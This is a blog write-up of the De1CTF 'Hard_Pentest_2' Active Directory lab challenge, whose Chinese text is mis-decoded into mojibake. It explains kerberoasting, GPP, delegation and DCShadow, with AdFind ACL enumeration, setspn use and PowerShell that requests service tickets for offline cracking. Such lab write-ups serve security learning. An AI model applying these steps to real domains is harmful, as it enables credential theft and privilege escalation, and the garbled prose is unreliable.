<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <title>
    De1ctf Hard_Pentest_2 |
    
    Mount4in</title>
  
    <link rel="shortcut icon" href="/favicon.ico">
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<script src="/js/pace.min.js"></script>

<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Mount4in" type="application/atom+xml">
</head>

<body>
<main class="content">
  <section class="outer">
  

<article id="post-De1ctf-pentest2" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
  
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      De1ctf Hard_Pentest_2
    </h1>
  
  




      </header>
    

    
      <div class="article-meta">
        <a href="/2020/05/09/De1ctf-pentest2/" class="article-date">
  <time datetime="2020-05-09T15:02:54.000Z" itemprop="datePublished">2020-05-09</time>
</a>
        
      </div>
    

    
      
    <div class="tocbot"></div>





    

    <div class="article-entry" itemprop="articleBody">
      


      
  <div class="article-gallery">
    <div class="article-gallery-photos">
      
        
          <img src="https://i.loli.net/2020/05/09/sEXf1RCtbzdFL4c.png" itemprop="image">
        
      
    </div>
  </div>


      
        
        <p>DE1CTFé¢˜ç›®çš„ç¯å¢ƒæŒç»­å¼€äº†ä¸€å‘¨çš„æ—¶é—´ï¼Œç„¶åç”¨äº†å…­å¤©çš„æ—¶é—´æ‰å¤ç°å®Œä¸€é“é¢˜ï¼Œæ˜¯ä¸€é“æ¶‰åŠåŸŸæ¸—é€çš„é¢˜ç›®ï¼Œå’Œå‡º</p>
<p>é¢˜äººå’¨è¯¢ï¼Œå¥½åƒé¢˜ç›®ç¯å¢ƒä¹Ÿæœ‰ç‚¹é—®é¢˜ï¼ŒæŒ‰ä»–çš„writeupä¸èƒ½æˆåŠŸï¼Œç„¶åè‡ªå·±æŸ¥èµ„æ–™åï¼Œæœ€åæˆåŠŸææƒï¼Œä½†æ˜¯æœ€åä¸€</p>
<p>æ­¥æ‹¿åˆ°åŸŸæ§è¯•äº†åŠå¤©è¿˜æ˜¯æ²¡æœ‰æˆåŠŸã€‚ç”±äºä¹‹å‰ä¹Ÿæ˜¯æ²¡æœ‰å­¦è¿‡åŸŸæ¸—é€è¿™æ–¹é¢ï¼Œå€Ÿç€ä»–çš„ç¯å¢ƒè¾¹å­¦ä¹ è¾¹å®è·µï¼Œå­¦åˆ°äº†å¾ˆ</p>
<p>å¤šçŸ¥è¯†ç‚¹å’Œä¸€äº›å·¥å…·çš„ä½¿ç”¨ï¼Œå¯¹åŸŸæ¸—é€ä¹Ÿæ˜¯æœ‰äº†ä¸€ç‚¹äº†è§£ï¼Œé¢˜ç›®å·§å¦™åœ°ç»“åˆäº†åŸŸæ¸—é€çš„ä¸€ç³»åˆ—çŸ¥è¯†ç‚¹ã€‚</p>
<a id="more"></a>

<ul>
<li>GPPæ¼æ´ï¼šç»„ç­–ç•¥é€‰é¡¹ï¼ˆGPPï¼‰ç»™åŸŸæˆå‘˜æ·»åŠ çš„è´¦æˆ·ä¿¡æ¯ä¼šä¿å­˜åœ¨SYSVOLæ–‡ä»¶å¤¹ä¸­ï¼Œä½¿ç”¨å¾®è½¯å…¬å¼€çš„å¯†é’¥å¯ä»¥ç›´æ¥è§£å¯†å‡ºå¯†ç ã€‚</li>
<li>kerberoastingï¼šå¦‚æœå½“å‰æ‹¥æœ‰ä¸€ä¸ªæ™®é€šçš„åŸŸç”¨æˆ·æƒé™ä¸”å¯¹ä¸€ä¸ªç”¨æˆ·æœ‰å†™å…¥spn(ServicePrincipalNames)çš„æƒé™,å°±å¯ä»¥è¿›è¡Œkerberoastingæ”»å‡»ï¼Œå¯ä»¥é€šè¿‡çˆ†ç ´å¾—åˆ°å¯¹åº”ç”¨æˆ·çš„å¯†ç ã€‚</li>
<li>åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾æ”»å‡»ï¼šä¸ªäººç†è§£ï¼Œä¼ ç»Ÿçš„çº¦æŸå§”æ´¾æ˜¯é€šè¿‡msDS-AllowedToDelegateTo è®¾ç½®äº†å½“å‰å¯ä»¥å§”æ´¾çš„å¯¹è±¡ï¼Œå³æˆ‘å¯ä»¥å§”æ´¾è°ï¼›ä¸åŒäºä¼ ç»Ÿçš„çº¦æŸå§”æ´¾ï¼ŒåŸºäºèµ„æºçš„çº¦æŸå§”æ´¾æ˜¯é€šè¿‡msDS-AllowedToActOnBehalfOfOtherIdentityæ¥è®¾ç½®è°å¯ä»¥å§”æ´¾æˆ‘ã€‚ä¸ªäººè®¤ä¸ºåŸç†å°±æ˜¯ä¼ªé€ TGSã€‚</li>
<li>DCshadow:åˆ©ç”¨åŸŸæ§ä¹‹é—´çš„æ•°æ®åŒæ­¥æ¨é€ï¼Œå‘æ´»åŠ¨ç›®å½•æ•°æ®åº“ä¸­æ³¨å…¥æ¶æ„æ•°æ®å¯¹è±¡ï¼ŒåŸç†è¿˜ä¸æ˜¯å¾ˆæ‡‚,å½“æœ‰ç‰¹æ®Šçš„ä¸€äº›æ‰©å±•æƒé™å°±å¯ä»¥åˆ©ç”¨DCshadowï¼Œä¿®æ”¹primaryGroupIDå±æ€§ï¼Œå˜æˆåŸŸæ§ã€‚</li>
</ul>
<h1 id="Hard-Pentest-2"><a href="#Hard-Pentest-2" class="headerlink" title="Hard_Pentest_2"></a>Hard_Pentest_2</h1><p><img src="/2020/05/09/De1ctf-pentest2/image-20200504160434565.png" alt="image-20200504160434565"></p>
<p>æç¤ºäº†de1taçš„æƒé™ï¼Œç„¶ååˆ©ç”¨AdFind.exeæŸ¥ä¸€ä¸‹ï¼Œæ‰§è¡Œ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -sc getacls -sddlfilter ;;;;;de1ctf2020\web -recmute</span><br><span class="line">AdFind.exe -s subtree -b &quot;cn&#x3D;de1ta,cn&#x3D;users,dc&#x3D;DE1CTF2020,dc&#x3D;lab&quot; -sc getacl -sddl++ -recmute</span><br></pre></td></tr></table></figure>

<p>å¯å¾—</p>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200506082021322.png" alt="image-20200506082021322"></p>
<p>webç”¨æˆ·å…·æœ‰å¯¹De1taç”¨æˆ·æœ‰å†™å…¥SPNæƒé™ã€‚å…·ä½“å¯ä»¥å‚è€ƒä¸‹é¢ï¼š</p>
<blockquote>
<h3 id="2-servicePrincipalName-28630EBB-41D5-11D1-A9C1-0000F80367C1"><a href="#2-servicePrincipalName-28630EBB-41D5-11D1-A9C1-0000F80367C1" class="headerlink" title="(2)  servicePrincipalName(28630EBB-41D5-11D1-A9C1-0000F80367C1)"></a><strong>(2)  servicePrincipalName(28630EBB-41D5-11D1-A9C1-0000F80367C1)</strong></h3><p>å¦‚æœå¯¹ä¸€ä¸ªå¯¹è±¡æœ‰å†™å…¥spnçš„æƒé™ï¼Œé‚£ä¹ˆå°±å¯ä»¥å¯¹è¿™ä¸ªå¯¹è±¡è¿›è¡Œkerberostingäº†ï¼Œå¦‚æœå¯†ç å¼ºåº¦ä¸å¼ºçš„è¯ï¼Œæœ‰æœºä¼šè·å–åˆ°å¯†ç ã€‚</p>
<p><img src="/2020/05/09/De1ctf-pentest2/t013148e2dda10cec6e.png" alt="img"></p>
<p><img src="/2020/05/09/De1ctf-pentest2/t0159a1c8ffeda51224.png" alt="img"></p>
<p><img src="/2020/05/09/De1ctf-pentest2/t011e4510fd1f6596c9.png" alt="img"></p>
<p>æœ‰æƒé™ï¼Œå¯ä»¥è®¾ç½®spn</p>
<p><img src="/2020/05/09/De1ctf-pentest2/t01a3ac6723857c3446.png" alt="img"></p>
<p>æŸ¥çœ‹spn</p>
<p><img src="/2020/05/09/De1ctf-pentest2/t01710d8bd30669d01d.png" alt="img"></p>
<p>kerberoasting</p>
<p><img src="/2020/05/09/De1ctf-pentest2/t014fc208e692a0e20e.png" alt="img"></p>
<p><a href="https://daiker.gitbook.io/windows-protocol/ldap-pian/12" target="_blank" rel="noopener">å‚è€ƒ</a></p>
</blockquote>
<p>ç„¶åå»è®¾ç½®spnï¼Œspnæ˜¯winè‡ªå¸¦çš„å·¥å…·ï¼Œä¸ç”¨ä¸Šä¼ ï¼Œ</p>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200506084714658.png" alt="image-20200506084714658"></p>
<p>åˆ©ç”¨spnè¿›è¡Œkerberoastingçš„åŸç†å¯ä»¥å‚è€ƒ<a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting/" target="_blank" rel="noopener">ä¸‹é¢</a>3gstudentå¸ˆå‚…æ–‡ç« ã€‚</p>
<blockquote>
<h3 id="SPN"><a href="#SPN" class="headerlink" title="SPN"></a>SPN</h3><p>å®˜æ–¹æ–‡æ¡£ï¼š</p>
<p><a href="https://docs.microsoft.com/en-us/windows/desktop/AD/service-principal-names" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/desktop/AD/service-principal-names</a></p>
<p>å…¨ç§°<code>Service Principal Names</code></p>
<p>SPNæ˜¯æœåŠ¡å™¨ä¸Šæ‰€è¿è¡ŒæœåŠ¡çš„å”¯ä¸€æ ‡è¯†ï¼Œæ¯ä¸ªä½¿ç”¨Kerberosçš„æœåŠ¡éƒ½éœ€è¦ä¸€ä¸ªSPN</p>
<p>SPNåˆ†ä¸ºä¸¤ç§ï¼Œä¸€ç§æ³¨å†Œåœ¨ADä¸Šæœºå™¨å¸æˆ·(Computers)ä¸‹ï¼Œå¦ä¸€ç§æ³¨å†Œåœ¨åŸŸç”¨æˆ·å¸æˆ·(Users)ä¸‹</p>
<p>å½“ä¸€ä¸ªæœåŠ¡çš„æƒé™ä¸º<code>Local System</code>æˆ–<code>Network Service</code>ï¼Œåˆ™SPNæ³¨å†Œåœ¨æœºå™¨å¸æˆ·(Computers)ä¸‹</p>
<p>å½“ä¸€ä¸ªæœåŠ¡çš„æƒé™ä¸ºä¸€ä¸ªåŸŸç”¨æˆ·ï¼Œåˆ™SPNæ³¨å†Œåœ¨åŸŸç”¨æˆ·å¸æˆ·(Users)ä¸‹</p>
<h3 id="SPNçš„æ ¼å¼"><a href="#SPNçš„æ ¼å¼" class="headerlink" title="SPNçš„æ ¼å¼"></a>SPNçš„æ ¼å¼</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">serviceclass&#x2F;host:port&#x2F;servicename</span><br></pre></td></tr></table></figure>

<p>è¯´æ˜ï¼š</p>
<ul>
<li>serviceclasså¯ä»¥ç†è§£ä¸ºæœåŠ¡çš„åç§°ï¼Œå¸¸è§çš„æœ‰www, ldap, SMTP, DNS, HOSTç­‰</li>
<li>hostæœ‰ä¸¤ç§å½¢å¼ï¼ŒFQDNå’ŒNetBIOSåï¼Œä¾‹å¦‚server01.test.comå’Œserver01</li>
<li>å¦‚æœæœåŠ¡è¿è¡Œåœ¨é»˜è®¤ç«¯å£ä¸Šï¼Œåˆ™ç«¯å£å·(port)å¯ä»¥çœç•¥</li>
</ul>
<h3 id="æŸ¥è¯¢SPN"><a href="#æŸ¥è¯¢SPN" class="headerlink" title="æŸ¥è¯¢SPN"></a>æŸ¥è¯¢SPN</h3><p>å¯¹åŸŸæ§åˆ¶å™¨å‘èµ·LDAPæŸ¥è¯¢ï¼Œè¿™æ˜¯æ­£å¸¸kerberosç¥¨æ®è¡Œä¸ºçš„ä¸€éƒ¨åˆ†ï¼Œå› æ­¤æŸ¥è¯¢SPNçš„æ“ä½œå¾ˆéš¾è¢«æ£€æµ‹</p>
<h4 id="1-ä½¿ç”¨SetSPN"><a href="#1-ä½¿ç”¨SetSPN" class="headerlink" title="(1) ä½¿ç”¨SetSPN"></a>(1) ä½¿ç”¨SetSPN</h4><p>Win7å’ŒWindows Server2008è‡ªå¸¦çš„å·¥å…·</p>
<p>æŸ¥çœ‹å½“å‰åŸŸå†…çš„æ‰€æœ‰SPNï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn.exe -q *&#x2F;*</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹teståŸŸå†…çš„æ‰€æœ‰SPNï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn.exe -T test -q *&#x2F;*</span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºç»“æœå®ä¾‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">CN&#x3D;DC1,OU&#x3D;Domain Controllers,DC&#x3D;test,DC&#x3D;com</span><br><span class="line">        exchangeRFR&#x2F;DC1</span><br><span class="line">        exchangeRFR&#x2F;DC1.test.com</span><br><span class="line">        exchangeMDB&#x2F;DC1.test.com</span><br><span class="line">        exchangeMDB&#x2F;DC1</span><br><span class="line">        exchangeAB&#x2F;DC1</span><br><span class="line">        exchangeAB&#x2F;DC1.test.com</span><br><span class="line">        SMTP&#x2F;DC1</span><br><span class="line">        SMTP&#x2F;DC1.test.com</span><br><span class="line">        SmtpSvc&#x2F;DC1</span><br><span class="line">        SmtpSvc&#x2F;DC1.test.com</span><br><span class="line">        ldap&#x2F;DC1.test.com&#x2F;ForestDnsZones.test.com</span><br><span class="line">        ldap&#x2F;DC1.test.com&#x2F;DomainDnsZones.test.com</span><br><span class="line">        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04&#x2F;DC1.test.com</span><br><span class="line">        DNS&#x2F;DC1.test.com</span><br><span class="line">        GC&#x2F;DC1.test.com&#x2F;test.com</span><br><span class="line">        RestrictedKrbHost&#x2F;DC1.test.com</span><br><span class="line">        RestrictedKrbHost&#x2F;DC1</span><br><span class="line">        HOST&#x2F;DC1&#x2F;TEST</span><br><span class="line">        HOST&#x2F;DC1.test.com&#x2F;TEST</span><br><span class="line">        HOST&#x2F;DC1</span><br><span class="line">        HOST&#x2F;DC1.test.com</span><br><span class="line">        HOST&#x2F;DC1.test.com&#x2F;test.com</span><br><span class="line">        E3514235-4B06-11D1-AB04-00C04FC2DCD2&#x2F;0f33253b-2314-40f0-b665-f4317b13e6b9&#x2F;test.com</span><br><span class="line">        ldap&#x2F;DC1&#x2F;TEST</span><br><span class="line">        ldap&#x2F;0f33253b-2314-40f0-b665-f4317b13e6b9._msdcs.test.com</span><br><span class="line">        ldap&#x2F;DC1.test.com&#x2F;TEST</span><br><span class="line">        ldap&#x2F;DC1</span><br><span class="line">        ldap&#x2F;DC1.test.com</span><br><span class="line">        ldap&#x2F;DC1.test.com&#x2F;test.com</span><br><span class="line">CN&#x3D;krbtgt,CN&#x3D;Users,DC&#x3D;test,DC&#x3D;com</span><br><span class="line">        kadmin&#x2F;changepw</span><br><span class="line">CN&#x3D;COMPUTER01,CN&#x3D;Computers,DC&#x3D;test,DC&#x3D;com</span><br><span class="line">        RestrictedKrbHost&#x2F;COMPUTER01</span><br><span class="line">        HOST&#x2F;COMPUTER01</span><br><span class="line">        RestrictedKrbHost&#x2F;COMPUTER01.test.com</span><br><span class="line">        HOST&#x2F;COMPUTER01.test.com</span><br><span class="line">CN&#x3D;MSSQL Service Admin,CN&#x3D;Users,DC&#x3D;test,DC&#x3D;com</span><br><span class="line">        MSSQLSvc&#x2F;DC1.test.com</span><br></pre></td></tr></table></figure>

<p>ä»¥CNå¼€å¤´çš„æ¯ä¸€è¡Œä»£è¡¨ä¸€ä¸ªå¸æˆ·ï¼Œå…¶ä¸‹çš„ä¿¡æ¯æ˜¯ä¸è¯¥å¸æˆ·ç›¸å…³è”çš„SPN</p>
<p>å¯¹äºä¸Šé¢çš„è¾“å‡ºæ•°æ®ï¼Œæœºå™¨å¸æˆ·(Computers)ä¸ºï¼š</p>
<ul>
<li>CN=DC1,OU=Domain Controllers,DC=test,DC=com</li>
<li>CN=COMPUTER01,CN=Computers,DC=test,DC=com</li>
</ul>
<p>åŸŸç”¨æˆ·å¸æˆ·(Users)ä¸ºï¼š</p>
<ul>
<li>CN=krbtgt,CN=Users,DC=test,DC=com</li>
<li>CN=MSSQL Service Admin,CN=Users,DC=test,DC=com</li>
</ul>
<p>æ³¨å†Œåœ¨åŸŸç”¨æˆ·å¸æˆ·(Users)ä¸‹çš„SPNæœ‰ä¸¤ä¸ªï¼š<code>kadmin/changepw</code>å’Œ<code>MSSQLSvc/DC1.test.com</code></p>
<h2 id="0x03-Kerberoastingçš„åŸç†"><a href="#0x03-Kerberoastingçš„åŸç†" class="headerlink" title="0x03 Kerberoastingçš„åŸç†"></a>0x03 Kerberoastingçš„åŸç†</h2><hr>
<h4 id="1ã€Kerberosè®¤è¯è¿‡ç¨‹"><a href="#1ã€Kerberosè®¤è¯è¿‡ç¨‹" class="headerlink" title="1ã€Kerberosè®¤è¯è¿‡ç¨‹"></a>1ã€Kerberosè®¤è¯è¿‡ç¨‹</h4><p>ä¸€ä¸ªç®€å•çš„Kerberosè®¤è¯è¿‡ç¨‹å¦‚ä¸‹å›¾</p>
<p><img src="/2020/05/09/De1ctf-pentest2/2-1.png" alt="Alt text"></p>
<ol>
<li>as_request</li>
<li>as_reply</li>
<li>tgs_request</li>
<li>tgs_reply</li>
<li>ap_request</li>
<li>ap_reply</li>
</ol>
<p>å¯¹äº4.tgs_replyï¼Œç”¨æˆ·å°†ä¼šæ”¶åˆ°ç”±ç›®æ ‡æœåŠ¡å®ä¾‹çš„NTLM hashåŠ å¯†ç”Ÿæˆçš„TGS(service ticket)ï¼ŒåŠ å¯†ç®—æ³•ä¸º<code>RC4-HMAC</code></p>
<p>ç«™åœ¨åˆ©ç”¨çš„è§’åº¦ï¼Œå½“è·å¾—è¿™ä¸ªTGSåï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ç©·ä¸¾å£ä»¤ï¼Œæ¨¡æ‹ŸåŠ å¯†è¿‡ç¨‹ï¼Œç”ŸæˆTGSè¿›è¡Œæ¯”è¾ƒã€‚å¦‚æœTGSç›¸åŒï¼Œä»£è¡¨å£ä»¤æ­£ç¡®ï¼Œå°±èƒ½è·å¾—ç›®æ ‡æœåŠ¡å®ä¾‹çš„æ˜æ–‡å£ä»¤</p>
<h4 id="2ã€Windowsç³»ç»Ÿé€šè¿‡SPNæŸ¥è¯¢è·å¾—æœåŠ¡å’ŒæœåŠ¡å®ä¾‹å¸æˆ·çš„å¯¹åº”å…³ç³»"><a href="#2ã€Windowsç³»ç»Ÿé€šè¿‡SPNæŸ¥è¯¢è·å¾—æœåŠ¡å’ŒæœåŠ¡å®ä¾‹å¸æˆ·çš„å¯¹åº”å…³ç³»" class="headerlink" title="2ã€Windowsç³»ç»Ÿé€šè¿‡SPNæŸ¥è¯¢è·å¾—æœåŠ¡å’ŒæœåŠ¡å®ä¾‹å¸æˆ·çš„å¯¹åº”å…³ç³»"></a>2ã€Windowsç³»ç»Ÿé€šè¿‡SPNæŸ¥è¯¢è·å¾—æœåŠ¡å’ŒæœåŠ¡å®ä¾‹å¸æˆ·çš„å¯¹åº”å…³ç³»</h4><p>è¿™é‡Œä¸¾ä¸€ä¸ªä¾‹å­ï¼š</p>
<p>ç”¨æˆ·aè¦è®¿é—®MySQLæœåŠ¡çš„èµ„æºï¼Œè¿›è¡Œåˆ°4.tgs_replyæ—¶ï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š</p>
<p>(1)Domain ControlleræŸ¥è¯¢MySQLæœåŠ¡çš„SPN</p>
<p>å¦‚æœè¯¥SPNæ³¨å†Œåœ¨æœºå™¨å¸æˆ·(Computers)ä¸‹ï¼Œå°†ä¼šæŸ¥è¯¢æ‰€æœ‰æœºå™¨å¸æˆ·(Computers)çš„servicePrincipalNameå±æ€§ï¼Œæ‰¾åˆ°å¯¹åº”çš„å¸æˆ·</p>
<p>å¦‚æœè¯¥SPNæ³¨å†Œåœ¨åŸŸç”¨æˆ·å¸æˆ·(Users)ä¸‹ï¼Œå°†ä¼šæŸ¥è¯¢æ‰€æœ‰åŸŸç”¨æˆ·(Users)çš„servicePrincipalNameå±æ€§ï¼Œæ‰¾åˆ°å¯¹åº”çš„å¸æˆ·</p>
<p>(2)æ‰¾åˆ°å¯¹åº”çš„å¸æˆ·åï¼Œä½¿ç”¨è¯¥å¸æˆ·çš„NTLM hashï¼Œç”ŸæˆTGS</p>
<h4 id="3ã€åŸŸå†…çš„ä¸»æœºéƒ½èƒ½æŸ¥è¯¢SPN"><a href="#3ã€åŸŸå†…çš„ä¸»æœºéƒ½èƒ½æŸ¥è¯¢SPN" class="headerlink" title="3ã€åŸŸå†…çš„ä¸»æœºéƒ½èƒ½æŸ¥è¯¢SPN"></a>3ã€åŸŸå†…çš„ä¸»æœºéƒ½èƒ½æŸ¥è¯¢SPN</h4><h4 id="4ã€åŸŸå†…çš„ä»»ä½•ç”¨æˆ·éƒ½å¯ä»¥å‘åŸŸå†…çš„ä»»ä½•æœåŠ¡è¯·æ±‚TGS"><a href="#4ã€åŸŸå†…çš„ä»»ä½•ç”¨æˆ·éƒ½å¯ä»¥å‘åŸŸå†…çš„ä»»ä½•æœåŠ¡è¯·æ±‚TGS" class="headerlink" title="4ã€åŸŸå†…çš„ä»»ä½•ç”¨æˆ·éƒ½å¯ä»¥å‘åŸŸå†…çš„ä»»ä½•æœåŠ¡è¯·æ±‚TGS"></a>4ã€åŸŸå†…çš„ä»»ä½•ç”¨æˆ·éƒ½å¯ä»¥å‘åŸŸå†…çš„ä»»ä½•æœåŠ¡è¯·æ±‚TGS</h4><p>ç»¼ä¸Šï¼ŒåŸŸå†…çš„ä»»ä½•ä¸€å°ä¸»æœºï¼Œéƒ½èƒ½å¤Ÿé€šè¿‡æŸ¥è¯¢SPNï¼Œå‘åŸŸå†…çš„æ‰€æœ‰æœåŠ¡è¯·æ±‚TGSï¼Œæ‹¿åˆ°TGSåå¯¹å…¶è¿›è¡Œæš´åŠ›ç ´è§£</p>
<p>å¯¹äºç ´è§£å‡ºçš„æ˜æ–‡å£ä»¤ï¼Œåªæœ‰åŸŸç”¨æˆ·å¸æˆ·(Users)çš„å£ä»¤å­˜åœ¨ä»·å€¼ï¼Œä¸å¿…è€ƒè™‘æœºå™¨å¸æˆ·çš„å£ä»¤(æ— æ³•ç”¨äºè¿œç¨‹è¿æ¥)</p>
<p>å› æ­¤ï¼Œé«˜æ•ˆç‡çš„åˆ©ç”¨æ€è·¯å¦‚ä¸‹ï¼š</p>
<ol>
<li>æŸ¥è¯¢SPNï¼Œæ‰¾åˆ°æœ‰ä»·å€¼çš„SPNï¼Œéœ€è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š<ul>
<li>è¯¥SPNæ³¨å†Œåœ¨åŸŸç”¨æˆ·å¸æˆ·(Users)ä¸‹</li>
<li>åŸŸç”¨æˆ·è´¦æˆ·çš„æƒé™å¾ˆé«˜</li>
</ul>
</li>
<li>è¯·æ±‚TGS</li>
<li>å¯¼å‡ºTGS</li>
<li>æš´åŠ›ç ´è§£</li>
</ol>
<h2 id="0x04-Kerberoastingçš„å®ç°æ–¹æ³•ä¸€"><a href="#0x04-Kerberoastingçš„å®ç°æ–¹æ³•ä¸€" class="headerlink" title="0x04 Kerberoastingçš„å®ç°æ–¹æ³•ä¸€"></a>0x04 Kerberoastingçš„å®ç°æ–¹æ³•ä¸€</h2><hr>
<h3 id="1ã€è·å¾—æœ‰ä»·å€¼çš„SPN"><a href="#1ã€è·å¾—æœ‰ä»·å€¼çš„SPN" class="headerlink" title="1ã€è·å¾—æœ‰ä»·å€¼çš„SPN"></a>1ã€è·å¾—æœ‰ä»·å€¼çš„SPN</h3><p>éœ€è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š</p>
<ul>
<li>è¯¥SPNæ³¨å†Œåœ¨åŸŸç”¨æˆ·å¸æˆ·(Users)ä¸‹</li>
<li>åŸŸç”¨æˆ·è´¦æˆ·çš„æƒé™å¾ˆé«˜</li>
</ul>
<p>å¯ä»¥é€‰æ‹©ä»¥ä¸‹ä¸‰ç§æ–¹æ³•ï¼š</p>
<h4 id="1-ä½¿ç”¨powershellæ¨¡å—Active-Directory"><a href="#1-ä½¿ç”¨powershellæ¨¡å—Active-Directory" class="headerlink" title="(1)ä½¿ç”¨powershellæ¨¡å—Active Directory"></a>(1)ä½¿ç”¨powershellæ¨¡å—Active Directory</h4><p><strong>æ³¨ï¼š</strong></p>
<p>powershellæ¨¡å—Active Directory éœ€è¦æå‰å®‰è£…ï¼ŒåŸŸæ§åˆ¶å™¨ä¸€èˆ¬ä¼šå®‰è£…</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import-module ActiveDirectory</span><br><span class="line">get-aduser -filter &#123;AdminCount -eq 1 -and (servicePrincipalName -ne 0)&#125; -prop * |select name,whencreated,pwdlastset,lastlogon</span><br></pre></td></tr></table></figure>

<p>å¯¹äºæœªå®‰è£…Active Directoryæ¨¡å—çš„ç³»ç»Ÿï¼Œå¯ä»¥é€šè¿‡å¦‚ä¸‹å‘½ä»¤å¯¼å…¥Active Directoryæ¨¡å—ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import-module .\Microsoft.ActiveDirectory.Management.dll</span><br></pre></td></tr></table></figure>

<p>Microsoft.ActiveDirectory.Management.dllåœ¨å®‰è£…powershellæ¨¡å—Active Directoryåç”Ÿæˆï¼Œæˆ‘å·²ç»æå–å‡ºæ¥å¹¶ä¸Šä¼ è‡³githubï¼š</p>
<p><a href="https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll" target="_blank" rel="noopener">https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll</a></p>
<h4 id="2-ä½¿ç”¨PowerView"><a href="#2-ä½¿ç”¨PowerView" class="headerlink" title="(2)ä½¿ç”¨PowerView"></a>(2)ä½¿ç”¨PowerView</h4><p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetUser -spn -AdminCount|Select name,whencreated,pwdlastset,lastlogon</span><br></pre></td></tr></table></figure>

<h4 id="3-ä½¿ç”¨kerberoast"><a href="#3-ä½¿ç”¨kerberoast" class="headerlink" title="(3)ä½¿ç”¨kerberoast"></a>(3)ä½¿ç”¨kerberoast</h4><p>powershell:</p>
<p><a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1</a></p>
<p>vbs:</p>
<p><a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs</a></p>
<p>å‚æ•°å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript GetUserSPNs.vbs</span><br></pre></td></tr></table></figure>

<h3 id="2ã€è¯·æ±‚TGS"><a href="#2ã€è¯·æ±‚TGS" class="headerlink" title="2ã€è¯·æ±‚TGS"></a>2ã€è¯·æ±‚TGS</h3><h4 id="1-è¯·æ±‚æŒ‡å®šTGS"><a href="#1-è¯·æ±‚æŒ‡å®šTGS" class="headerlink" title="(1)è¯·æ±‚æŒ‡å®šTGS"></a>(1)è¯·æ±‚æŒ‡å®šTGS</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$SPNName &#x3D; &#39;MSSQLSvc&#x2F;DC1.test.com&#39;</span><br><span class="line">Add-Type -AssemblyNAme System.IdentityModel</span><br><span class="line">New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName</span><br></pre></td></tr></table></figure>

